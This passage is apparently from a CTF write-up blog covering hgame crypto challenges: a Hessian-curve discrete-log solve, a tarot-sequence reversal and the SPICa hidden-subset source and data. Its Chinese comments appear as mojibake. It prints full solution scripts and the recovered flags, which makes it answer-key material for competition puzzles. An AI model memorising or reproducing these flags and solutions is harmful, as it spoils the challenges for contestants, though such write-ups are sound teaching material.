class="hljs-string">b&quot;k\xe8\xbe\x94\x9e\xfc\xe2\x9e\x97\xe5\xf3\x04&#x27;\x8f\xb2\x01T\x06\x88\x04\xeb3Jl\xdd Pk$\x00:\xf5&quot;</span>   <span class="hljs-comment">#å¯†æ–‡</span><br>Gx,Gy=G     <span class="hljs-comment">#æå–Gçš„xï¼Œyåæ ‡</span><br>Qx,Qy=Q     <span class="hljs-comment">#æå–Qçš„xï¼Œyåæ ‡</span><br><br>M=matrix(GF(p),[[-Gx**<span class="hljs-number">3</span>,Gx*Gy],[-Qx**<span class="hljs-number">3</span>,Qx*Qy]]) <span class="hljs-comment">#æ„é€ 2*2çŸ©é˜µ</span><br>y=vector(GF(p),[Gy**<span class="hljs-number">3</span>+<span class="hljs-number">1</span>,Qy**<span class="hljs-number">3</span>+<span class="hljs-number">1</span>])               <span class="hljs-comment">#æ„é€ å‘é‡</span><br>a,d=M.solve_right(y)                            <span class="hljs-comment">#æ±‚è§£çº¿æ€§æ–¹ç¨‹ç»„</span><br><span class="hljs-built_in">print</span>(a,d)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">calculate_coefficients</span>(<span class="hljs-params">a, d</span>):<br>    d_3 = d*inverse(<span class="hljs-number">3</span>, p)%p             <span class="hljs-comment"># d / 3</span><br>    tmp = a - d_3**<span class="hljs-number">3</span>                    <span class="hljs-comment"># a - d^3/27</span><br>    a0 = <span class="hljs-number">1</span><br>    a1 = (-<span class="hljs-number">3</span> * d_3 * inverse(tmp, p))%p<br>    a3 = (-<span class="hljs-number">9</span> * inverse(tmp**<span class="hljs-number">2</span>, p)) % p<br>    a2 = (-<span class="hljs-number">9</span> * d_3**<span class="hljs-number">2</span> * inverse(tmp**<span class="hljs-number">2</span>, p))%p<br>    a4 = (-<span class="hljs-number">27</span> * d_3 * inverse(tmp**<span class="hljs-number">3</span>, p))%p<br>    a6 = (-<span class="hljs-number">27</span> * inverse(tmp**<span class="hljs-number">4</span>, p))%p<br><br>    <span class="hljs-keyword">return</span> [a1, a2, a3, a4, a6]<br><br>aa = calculate_coefficients(a, d)<br>E = EllipticCurve(GF(p), aa)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Herssian_to_Weierstrass</span>(<span class="hljs-params">Point</span>):<br>    x, y = Point<br>    u = ((-<span class="hljs-number">3</span> * inverse((a - d^<span class="hljs-number">3</span>*inverse(<span class="hljs-number">27</span>, p)), p)*x * inverse(d*x*inverse(<span class="hljs-number">3</span>,p) - (-y) + <span class="hljs-number">1</span>, p))) % p<br>    v = ((-<span class="hljs-number">9</span> * inverse((a - d^<span class="hljs-number">3</span>*inverse(<span class="hljs-number">27</span>, p))^<span class="hljs-number">2</span>, p) ) * (-y) * inverse(d*x*inverse(<span class="hljs-number">3</span>,p) - (-y) + <span class="hljs-number">1</span>, p))%p<br>    <span class="hljs-keyword">return</span> (u, v)<br><br><br>G = E(Herssian_to_Weierstrass(G))<br>Q = E(Herssian_to_Weierstrass(Q))<br>k = discrete_log(Q,G,operation=<span class="hljs-string">&#x27;+&#x27;</span>)<br><span class="hljs-built_in">print</span>(k)<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> sha256<br>key=sha256(<span class="hljs-built_in">str</span>(k).encode()).digest()<br>aes=AES.new(key,AES.MODE_ECB)<br><span class="hljs-built_in">print</span>(aes.decrypt(ciphertext))<br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">39081810733380615260725035189 8569490478014112404683314361</span><br><span class="hljs-string">2633177798829352921583206736</span><br><span class="hljs-string">b&#x27;hgame&#123;N0th1ng_bu7_up_Up_UP!&#125;\x04\x04\x04\x04&#x27;</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></td></tr></table></figure><h2 id="5-Ancient-Recall"><a href="#5-Ancient-Recall" class="headerlink" title="5.Ancient Recall"></a>5.Ancient Recall</h2><p><strong>é¢˜ç›®ï¼š</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> random<br><br>Major_Arcana = [<span class="hljs-string">&quot;The Fool&quot;</span>, <span class="hljs-string">&quot;The Magician&quot;</span>, <span class="hljs-string">&quot;The High Priestess&quot;</span>,<span class="hljs-string">&quot;The Empress&quot;</span>, <span class="hljs-string">&quot;The Emperor&quot;</span>, <span class="hljs-string">&quot;The Hierophant&quot;</span>,<span class="hljs-string">&quot;The Lovers&quot;</span>, <span class="hljs-string">&quot;The Chariot&quot;</span>, <span class="hljs-string">&quot;Strength&quot;</span>,<span class="hljs-string">&quot;The Hermit&quot;</span>, <span class="hljs-string">&quot;Wheel of Fortune&quot;</span>, <span class="hljs-string">&quot;Justice&quot;</span>,<span class="hljs-string">&quot;The Hanged Man&quot;</span>, <span class="hljs-string">&quot;Death&quot;</span>, <span class="hljs-string">&quot;Temperance&quot;</span>,<span class="hljs-string">&quot;The Devil&quot;</span>, <span class="hljs-string">&quot;The Tower&quot;</span>, <span class="hljs-string">&quot;The Star&quot;</span>,<span class="hljs-string">&quot;The Moon&quot;</span>, <span class="hljs-string">&quot;The Sun&quot;</span>, <span class="hljs-string">&quot;Judgement&quot;</span>,<span class="hljs-string">&quot;The World&quot;</span>]<br>wands = [<span class="hljs-string">&quot;Ace of Wands&quot;</span>, <span class="hljs-string">&quot;Two of Wands&quot;</span>, <span class="hljs-string">&quot;Three of Wands&quot;</span>, <span class="hljs-string">&quot;Four of Wands&quot;</span>, <span class="hljs-string">&quot;Five of Wands&quot;</span>, <span class="hljs-string">&quot;Six of Wands&quot;</span>, <span class="hljs-string">&quot;Seven of Wands&quot;</span>, <span class="hljs-string">&quot;Eight of Wands&quot;</span>, <span class="hljs-string">&quot;Nine of Wands&quot;</span>, <span class="hljs-string">&quot;Ten of Wands&quot;</span>, <span class="hljs-string">&quot;Page of Wands&quot;</span>, <span class="hljs-string">&quot;Knight of Wands&quot;</span>, <span class="hljs-string">&quot;Queen of Wands&quot;</span>, <span class="hljs-string">&quot;King of Wands&quot;</span>]<br>cups = [<span class="hljs-string">&quot;Ace of Cups&quot;</span>, <span class="hljs-string">&quot;Two of Cups&quot;</span>, <span class="hljs-string">&quot;Three of Cups&quot;</span>, <span class="hljs-string">&quot;Four of Cups&quot;</span>, <span class="hljs-string">&quot;Five of Cups&quot;</span>, <span class="hljs-string">&quot;Six of Cups&quot;</span>, <span class="hljs-string">&quot;Seven of Cups&quot;</span>, <span class="hljs-string">&quot;Eight of Cups&quot;</span>, <span class="hljs-string">&quot;Nine of Cups&quot;</span>, <span class="hljs-string">&quot;Ten of Cups&quot;</span>, <span class="hljs-string">&quot;Page of Cups&quot;</span>, <span class="hljs-string">&quot;Knight of Cups&quot;</span>, <span class="hljs-string">&quot;Queen of Cups&quot;</span>, <span class="hljs-string">&quot;King of Cups&quot;</span>]<br>swords = [<span class="hljs-string">&quot;Ace of Swords&quot;</span>, <span class="hljs-string">&quot;Two of Swords&quot;</span>, <span class="hljs-string">&quot;Three of Swords&quot;</span>, <span class="hljs-string">&quot;Four of Swords&quot;</span>, <span class="hljs-string">&quot;Five of Swords&quot;</span>, <span class="hljs-string">&quot;Six of Swords&quot;</span>, <span class="hljs-string">&quot;Seven of Swords&quot;</span>, <span class="hljs-string">&quot;Eight of Swords&quot;</span>, <span class="hljs-string">&quot;Nine of Swords&quot;</span>, <span class="hljs-string">&quot;Ten of Swords&quot;</span>, <span class="hljs-string">&quot;Page of Swords&quot;</span>, <span class="hljs-string">&quot;Knight of Swords&quot;</span>, <span class="hljs-string">&quot;Queen of Swords&quot;</span>, <span class="hljs-string">&quot;King of Swords&quot;</span>]<br>pentacles = [<span class="hljs-string">&quot;Ace of Pentacles&quot;</span>, <span class="hljs-string">&quot;Two of Pentacles&quot;</span>, <span class="hljs-string">&quot;Three of Pentacles&quot;</span>, <span class="hljs-string">&quot;Four of Pentacles&quot;</span>, <span class="hljs-string">&quot;Five of Pentacles&quot;</span>, <span class="hljs-string">&quot;Six of Pentacles&quot;</span>, <span class="hljs-string">&quot;Seven of Pentacles&quot;</span>, <span class="hljs-string">&quot;Eight of Pentacles&quot;</span>, <span class="hljs-string">&quot;Nine of Pentacles&quot;</span>, <span class="hljs-string">&quot;Ten of Pentacles&quot;</span>, <span class="hljs-string">&quot;Page of Pentacles&quot;</span>, <span class="hljs-string">&quot;Knight of Pentacles&quot;</span>, <span class="hljs-string">&quot;Queen of Pentacles&quot;</span>, <span class="hljs-string">&quot;King of Pentacles&quot;</span>]<br>Minor_Arcana = wands + cups + swords + pentacles<br><span class="hljs-built_in">print</span>(Minor_Arcana)<br>tarot = Major_Arcana + Minor_Arcana<br>reversals = [<span class="hljs-number">0</span>,-<span class="hljs-number">1</span>]<br><br>Value = []<br>cards = []<br>YOUR_initial_FATE = []<br><span class="hljs-keyword">while</span> <span class="hljs-built_in">len</span>(YOUR_initial_FATE)&lt;<span class="hljs-number">5</span>:<br>    card = random.choice(tarot)<br>    <span class="hljs-keyword">if</span> card <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> cards:<br>        cards.append(card)<br>        <span class="hljs-keyword">if</span> card <span class="hljs-keyword">in</span> Major_Arcana:<br>            k = random.choice(reversals)<br>            Value.append(tarot.index(card)^k)<br>            <span class="hljs-keyword">if</span> k == -<span class="hljs-number">1</span>:<br>                YOUR_initial_FATE.append(<span class="hljs-string">&quot;re-&quot;</span>+card)<br>            <span class="hljs-keyword">else</span>:<br>                YOUR_initial_FATE.append(card)<br>        <span class="hljs-keyword">else</span>:<br>            Value.append(tarot.index(card))<br>            YOUR_initial_FATE.append(card)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">continue</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Oops!lets reverse 1T!&quot;</span>)<br><br>FLAG=(<span class="hljs-string">&quot;hgame&#123;&quot;</span>+<span class="hljs-string">&quot;&amp;&quot;</span>.join(YOUR_initial_FATE)+<span class="hljs-string">&quot;&#125;&quot;</span>).replace(<span class="hljs-string">&quot; &quot;</span>,<span class="hljs-string">&quot;_&quot;</span>)   <span class="hljs-comment">#å¯çŸ¥æˆ‘ä»¬çš„ç›®çš„æ˜¯æ±‚YOUR_initial_FATE</span><br><br>YOUR_final_Value = Value<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Fortune_wheel</span>(<span class="hljs-params">FATE</span>):<br>    FATEd = [FATE[i]+FATE[(i+<span class="hljs-number">1</span>)%<span class="hljs-number">5</span>] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(FATE))]<br>    <span class="hljs-keyword">return</span> FATEd<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">250</span>):<br>    YOUR_final_Value = Fortune_wheel(YOUR_final_Value)<br><span class="hljs-built_in">print</span>(YOUR_final_Value)<br>YOUR_final_FATE = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> YOUR_final_Value:<br>    YOUR_final_FATE.append(tarot[i%<span class="hljs-number">78</span>])<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Your destiny changed!\n&quot;</span>,<span class="hljs-string">&quot;,&quot;</span>.join(YOUR_final_FATE))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;oh,now you GET th3 GOOd lU&gt;k,^^&quot;</span>)<br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">Oops!lets reverse 1T!</span><br><span class="hljs-string">[2532951952066291774890498369114195917240794704918210520571067085311474675019, 2532951952066291774890327666074100357898023013105443178881294700381509795270, 2532951952066291774890554459287276604903130315859258544173068376967072335730, 2532951952066291774890865328241532885391510162611534514014409174284299139015, 2532951952066291774890830662608134156017946376309989934175833913921142609334]</span><br><span class="hljs-string">Your destiny changed!</span><br><span class="hljs-string"> Eight of Cups,Ace of Cups,Strength,The Chariot,Five of Swords</span><br><span class="hljs-string">oh,now you GET th3 GOOd lU&gt;k,^^</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></td></tr></table></figure><p><strong>åˆ†æï¼š</strong></p><p>é‡ç‚¹åœ¨äºé€†<code>YOUR_initial_Value</code>æ¥æ±‚<code>Value</code>ã€‚</p><p>å‡è®¾<code>YOUR_initial_Value</code>ä¸Šä¸€çŠ¶æ€ä¸º<code>a,b,c,d,e</code>,åˆ™ä¸‹ä¸€çŠ¶æ€ä¸º<code>a+b,b+c,c+d,d+e,e+a</code>ï¼Œæ‰€ä»¥é€†å‘<code>(a+b)-(b+c)+(c+d)-(d+e)+(e+a)//2=a</code>æ¥åˆ†åˆ«æ±‚ä¸Šä¸€çŠ¶æ€çš„<code>a,b,c,d,e</code>ï¼Œå¾ªç¯250æ¬¡å³å¯å¾—åˆ°<code>Value</code>ã€‚</p><p>ç„¶åæŒ‰æ¡ä»¶æ‹¼æ¥ï¼Œå³å¯å¾—åˆ°flagã€‚</p><p><strong>è§£ç­”ï¼š</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#æå–ä¿¡æ¯ï¼Œåˆ†ææ‰€éœ€é‡ï¼Œå†é€†å‘åˆ†æå¦‚ä½•æ±‚å¾—æ‰€éœ€å€¼</span><br>Major_Arcana = [<span class="hljs-string">&quot;The Fool&quot;</span>, <span class="hljs-string">&quot;The Magician&quot;</span>, <span class="hljs-string">&quot;The High Priestess&quot;</span>,<span class="hljs-string">&quot;The Empress&quot;</span>, <span class="hljs-string">&quot;The Emperor&quot;</span>, <span class="hljs-string">&quot;The Hierophant&quot;</span>,<span class="hljs-string">&quot;The Lovers&quot;</span>, <span class="hljs-string">&quot;The Chariot&quot;</span>, <span class="hljs-string">&quot;Strength&quot;</span>,<span class="hljs-string">&quot;The Hermit&quot;</span>, <span class="hljs-string">&quot;Wheel of Fortune&quot;</span>, <span class="hljs-string">&quot;Justice&quot;</span>,<span class="hljs-string">&quot;The Hanged Man&quot;</span>, <span class="hljs-string">&quot;Death&quot;</span>, <span class="hljs-string">&quot;Temperance&quot;</span>,<span class="hljs-string">&quot;The Devil&quot;</span>, <span class="hljs-string">&quot;The Tower&quot;</span>, <span class="hljs-string">&quot;The Star&quot;</span>,<span class="hljs-string">&quot;The Moon&quot;</span>, <span class="hljs-string">&quot;The Sun&quot;</span>, <span class="hljs-string">&quot;Judgement&quot;</span>,<span class="hljs-string">&quot;The World&quot;</span>]<br>wands = [<span class="hljs-string">&quot;Ace of Wands&quot;</span>, <span class="hljs-string">&quot;Two of Wands&quot;</span>, <span class="hljs-string">&quot;Three of Wands&quot;</span>, <span class="hljs-string">&quot;Four of Wands&quot;</span>, <span class="hljs-string">&quot;Five of Wands&quot;</span>, <span class="hljs-string">&quot;Six of Wands&quot;</span>, <span class="hljs-string">&quot;Seven of Wands&quot;</span>, <span class="hljs-string">&quot;Eight of Wands&quot;</span>, <span class="hljs-string">&quot;Nine of Wands&quot;</span>, <span class="hljs-string">&quot;Ten of Wands&quot;</span>, <span class="hljs-string">&quot;Page of Wands&quot;</span>, <span class="hljs-string">&quot;Knight of Wands&quot;</span>, <span class="hljs-string">&quot;Queen of Wands&quot;</span>, <span class="hljs-string">&quot;King of Wands&quot;</span>]<br>cups = [<span class="hljs-string">&quot;Ace of Cups&quot;</span>, <span class="hljs-string">&quot;Two of Cups&quot;</span>, <span class="hljs-string">&quot;Three of Cups&quot;</span>, <span class="hljs-string">&quot;Four of Cups&quot;</span>, <span class="hljs-string">&quot;Five of Cups&quot;</span>, <span class="hljs-string">&quot;Six of Cups&quot;</span>, <span class="hljs-string">&quot;Seven of Cups&quot;</span>, <span class="hljs-string">&quot;Eight of Cups&quot;</span>, <span class="hljs-string">&quot;Nine of Cups&quot;</span>, <span class="hljs-string">&quot;Ten of Cups&quot;</span>, <span class="hljs-string">&quot;Page of Cups&quot;</span>, <span class="hljs-string">&quot;Knight of Cups&quot;</span>, <span class="hljs-string">&quot;Queen of Cups&quot;</span>, <span class="hljs-string">&quot;King of Cups&quot;</span>]<br>swords = [<span class="hljs-string">&quot;Ace of Swords&quot;</span>, <span class="hljs-string">&quot;Two of Swords&quot;</span>, <span class="hljs-string">&quot;Three of Swords&quot;</span>, <span class="hljs-string">&quot;Four of Swords&quot;</span>, <span class="hljs-string">&quot;Five of Swords&quot;</span>, <span class="hljs-string">&quot;Six of Swords&quot;</span>, <span class="hljs-string">&quot;Seven of Swords&quot;</span>, <span class="hljs-string">&quot;Eight of Swords&quot;</span>, <span class="hljs-string">&quot;Nine of Swords&quot;</span>, <span class="hljs-string">&quot;Ten of Swords&quot;</span>, <span class="hljs-string">&quot;Page of Swords&quot;</span>, <span class="hljs-string">&quot;Knight of Swords&quot;</span>, <span class="hljs-string">&quot;Queen of Swords&quot;</span>, <span class="hljs-string">&quot;King of Swords&quot;</span>]<br>pentacles = [<span class="hljs-string">&quot;Ace of Pentacles&quot;</span>, <span class="hljs-string">&quot;Two of Pentacles&quot;</span>, <span class="hljs-string">&quot;Three of Pentacles&quot;</span>, <span class="hljs-string">&quot;Four of Pentacles&quot;</span>, <span class="hljs-string">&quot;Five of Pentacles&quot;</span>, <span class="hljs-string">&quot;Six of Pentacles&quot;</span>, <span class="hljs-string">&quot;Seven of Pentacles&quot;</span>, <span class="hljs-string">&quot;Eight of Pentacles&quot;</span>, <span class="hljs-string">&quot;Nine of Pentacles&quot;</span>, <span class="hljs-string">&quot;Ten of Pentacles&quot;</span>, <span class="hljs-string">&quot;Page of Pentacles&quot;</span>, <span class="hljs-string">&quot;Knight of Pentacles&quot;</span>, <span class="hljs-string">&quot;Queen of Pentacles&quot;</span>, <span class="hljs-string">&quot;King of Pentacles&quot;</span>]<br>Minor_Arcana = wands + cups + swords + pentacles<br>tarot = Major_Arcana + Minor_Arcana<br><br>Value=[]<br>YOUR_initial_FATE=[]<br>YOUR_final_Value=[<span class="hljs-number">2532951952066291774890498369114195917240794704918210520571067085311474675019</span>, <span class="hljs-number">2532951952066291774890327666074100357898023013105443178881294700381509795270</span>, <span class="hljs-number">2532951952066291774890554459287276604903130315859258544173068376967072335730</span>, <span class="hljs-number">2532951952066291774890865328241532885391510162611534514014409174284299139015</span>, <span class="hljs-number">2532951952066291774890830662608134156017946376309989934175833913921142609334</span>]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">re_Fortune_wheel</span>(<span class="hljs-params">FATE</span>):<br>    FATE[<span class="hljs-number">0</span>] = (FATE[<span class="hljs-number">0</span>]-FATE[<span class="hljs-number">1</span>]+FATE[<span class="hljs-number">2</span>]-FATE[<span class="hljs-number">3</span>]+FATE[<span class="hljs-number">4</span>]) // <span class="hljs-number">2</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>,<span class="hljs-number">0</span>,-<span class="hljs-number">1</span>):<br>        FATE[i]=FATE[i]-FATE[(i+<span class="hljs-number">1</span>)%<span class="hljs-number">5</span>]<br>    <span class="hljs-keyword">return</span> FATE<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">250</span>):<br>    YOUR_final_Value = re_Fortune_wheel(YOUR_final_Value)<br><br><span class="hljs-built_in">print</span>(YOUR_final_Value)<br>Value=YOUR_final_Value<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> Value:<br>    <span class="hljs-keyword">if</span> i &lt; <span class="hljs-number">0</span>:<br>        i = i ^ -<span class="hljs-number">1</span><br>        <span class="hljs-built_in">print</span>(tarot[i])<br>        YOUR_initial_FATE.append(<span class="hljs-string">&quot;re-&quot;</span>+tarot[i])<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(tarot[i])<br>        YOUR_initial_FATE.append(tarot[i])<br><br>FLAG=(<span class="hljs-string">&quot;hgame&#123;&quot;</span>+<span class="hljs-string">&quot;&amp;&quot;</span>.join(YOUR_initial_FATE)+<span class="hljs-string">&quot;&#125;&quot;</span>).replace(<span class="hljs-string">&quot; &quot;</span>,<span class="hljs-string">&quot;_&quot;</span>)<br><span class="hljs-built_in">print</span>(FLAG)<br><span class="hljs-comment">#hgame&#123;re-The_Moon&amp;re-The_Sun&amp;Judgement&amp;re-Temperance&amp;Six_of_Cups&#125;</span><br></code></pre></td></tr></table></figure><h2 id="6-SPICa"><a href="#6-SPICa" class="headerlink" title="6.SPICa"></a>6.SPICa</h2><p><strong>é¢˜ç›®ï¼š</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> getPrime, long_to_bytes,bytes_to_long<br><span class="hljs-keyword">from</span> secrets <span class="hljs-keyword">import</span> flag<br><span class="hljs-keyword">from</span> sage.<span class="hljs-built_in">all</span> <span class="hljs-keyword">import</span> *<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">derive_M</span>(<span class="hljs-params">n</span>):<br>    iota=<span class="hljs-number">0.035</span><br>    Mbits=<span class="hljs-built_in">int</span>(<span class="hljs-number">2</span> * iota * n^<span class="hljs-number">2</span> + n * log(n,<span class="hljs-number">2</span>))<br>    M = random_prime(<span class="hljs-number">2</span>^Mbits, proof = <span class="hljs-literal">False</span>, lbound = <span class="hljs-number">2</span>^(Mbits - <span class="hljs-number">1</span>))<br>    <span class="hljs-keyword">return</span> Integer(M)<br><br>m = bytes_to_long(flag).bit_length()<br>n = <span class="hljs-number">70</span><br>p = derive_M(n)<br><br><br>F = GF(p)<br>x = random_matrix(F, <span class="hljs-number">1</span>, n)<br>A = random_matrix(ZZ, n, m, x=<span class="hljs-number">0</span>, y=<span class="hljs-number">2</span>)<br>A[randint(<span class="hljs-number">0</span>, n-<span class="hljs-number">1</span>)] = vector(ZZ, <span class="hljs-built_in">list</span>(<span class="hljs-built_in">bin</span>(bytes_to_long(flag))[<span class="hljs-number">2</span>:]))<br>flag=long_to_bytes(<span class="hljs-built_in">int</span>(<span class="hljs-string">&#x27;&#x27;</span>.join(A[i])))<br>h = x*A<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;data.txt&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>) <span class="hljs-keyword">as</span> file:<br>    file.write(<span class="hljs-built_in">str</span>(m) + <span class="hljs-string">&quot;\n&quot;</span>)<br>    file.write(<span class="hljs-built_in">str</span>(p) + <span class="hljs-string">&quot;\n&quot;</span>)<br>    <span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> h:<br>        file.write(<span class="hljs-built_in">str</span>(item) + <span class="hljs-string">&quot;\n&quot;</span>)<br></code></pre></td></tr></table></figure><p>å…¶ä¸­<code>data.txt</code>å†…å®¹ä¸º</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs context">(20469155492003601253253155553986803208931503654660710348720234166881649344003987262947017659012241047835048808070655285602897209239858740637878468266658899337230431317158339301884716019022543563824842749256770110913729930512649260804, 20061197539347089441548703718074268696982927733926399966893938885418017706383655096958576679109275153818455164325651467862757293092935593603331322600268652102317484783972009137643693799482954597365244794142123800753823881292602536480, 20449460766608148327819595887200586456206801278670684512632410913015490167503229582572274670752456522031099839096710051732743590814126659553219421423179332067697185796944680381658040503559588413035145948011713429631258754626251809510, 8694899395827009396141425992800033658778511870582271935710336140733986029271840480988700276909069199154936459475590420059851372448080387583101099303513327440738409895238607476203278712316251695883695113189088200686962847017765865251, 17498906738048927737996405866022970301450352038432120213930838838210038594926299429345553642022023354628862755091766856471553830387207275486875845428629363403317202957206875712023311105409026776222751170693634497194866213310044491948, 21299762658878585689792741107233334119508283391034542047533549461069861697448477916998731369486958411519583373650555867155855962437320409451328328158651213135213221691391305300586647640883613895924445303848945011091274872544725674414, 13858127090108368287746753156610976181884852029313352847097417269439999009242391680724254761571841185603751824488440165104153860614293879561204207753769517496283139692448618313378608851838592204671380865578837501521485226960295757131, 606107901015597672365982103377292862084693785965621044158858796689187941648736569096576321682310287031175045717941165527209428043020224184139162372752993919547870816012630061403517257290792929118011920477984972488980800309428929138, 16411347559169875469676322308290176281268630976465248631394286269278754960475346068565041099592979349979405282500383230219337689652572250821233598049978719348544790979587439571926076421698781802827344619141310395216702580071924399522, 6068129514673183503857587322729184998437772152551135658369680702133087671031996497962264049216246290631119377494262423727768860757742407967523061034172791840869912562774945606863954031992955819024967183759253919768822212999747782744, 16164073883659743891300469301841345466013040331496294498459841128458772221808605865298982279094019325297165362518613472961615756988375470180863560145427159107654477630571820179272488975849163426474631458599008988483395281798203200528, 6002652834833034433754084876025091748505356485760658745433173659340361267044983148952514860044218624345794714339893198968695437915359546317081144940354972707822464098838782671025813140852500245911841467802762732970205945777188441808, 17671459116121703756342696273829703490771262874572413082113674648287158047430332224637950989312667436860899021459708831070319841598164702019251450606454194564607879044661224315550514675652908609424461409598055757760711713272045049260, 9747804618981818225871997793952044666360767497788933437958387359050267555950930083105832397549316456989456304967283430526550121320745106610566272812291168897483422111931300711618308924263505765555678625775964949832562993340397250411, 21996324872073077242827998678880398901946388402016282475335311894567710762615152283467554531548297081386048827720410652120091647717684967177129064563480634873781425892452230881151261828547497099982851340353851101348946158575303726724, 20241128353291496652549108347619870477868850796680814076775175545760753973504668850036916374732720117160823389137853705825323283084380525440155558201212646427779126805749122859405488144164760267716232853839558997235342814050866837305, 13077656588899945700177181105263191868661064142860342679420184386239288545559858208951244435002966218243471420411045127025170552814160049125443370520964733258446212562129228879028530411822623695945498142516847896364762727423847457569, 7071530328065960890228453106008174199753371584339217118863740503556709237910489181283781927314970563878932442685277071347084354303239011911501455742585794028015220762730525765723336697380407902300153076264167533419216642860030224808, 22629252419865938253406009966521328587876533319128691562733593432194850726544929405088413178711982271889635298452313176698526192124305038839672198237812975135604141185210235559237447902236397265515318102940456244538398518752792480319, 5761459282176273118441944774799317407926062706007941700537400300748276958322349624237180755323800649847915919270480127859496807988229286598479624333300775674629423967322510405098758253061619727977005010935095672626407042895060271117, 13639378161376676791792650903794774452153629456935313476059754419699524574293526097694165098576687387486041665215960405733414879557245739928959501291435121608217008600392918108625339394853036499361173570509333162629246799468258136355, 1112221399019911081496513796105161716836267107501837651409516901292548472550496647130548616639784532217354650999157000279855022754714713097738729659495163953274484703014544784112610298442477231451271844048275322265529309125867188484, 12169161457053461668887038869671670176419946971662802953933166632081503259881448728851846332111194017082971192703865066066994163285010795828715477686499512514182295671281701232618183396077110570747529444745554508737426539555889099083, 11995511934849768905988062930456188671563166274831822681485210668895901448904842487096473591287554694509756168119490699415704136424403683840102743199694489304702405180406601329931714339410923612708808717358223085506757046662329629503, 13398528474737208001694948941230339341569100018647773619061861109738576104252100110443962069174319732180553417809151715735410100005179978063724591835291397314433312440421293983105825390167635459002960994550698739443052006993415149287, 